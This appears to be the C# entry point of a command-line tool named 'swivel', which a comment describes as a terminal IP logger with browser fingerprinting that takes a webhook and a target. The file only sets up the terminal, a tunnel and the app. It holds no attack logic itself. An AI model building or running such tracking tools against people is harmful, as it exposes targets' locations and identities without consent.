using Swivel.Core;
using Swivel.Ui;

// swivel - terminal IP logger with browser fingerprinting.
// usage: swivel [webhook] [target]

var webhook = args.Length > 0 ? args[0] : "";
var target = args.Length > 1 ? args[1] : "";

if (!Terminal.EnableAnsi())
{
    Console.Error.WriteLine("[!] terminal setup failed");
    return 1;
}
if (!Terminal.IsInteractive())
{
    Console.Error.WriteLine("[!] stdio is redirected; run swivel in a real terminal.");
    return 1;
}

var runtime = new Runtime();
_ = Tunnel.Ensure(runtime.Notes);
Console.WriteLine("[+] bootstrap complete\n");

var app = new App(runtime, webhook, target);
return await app.RunAsync();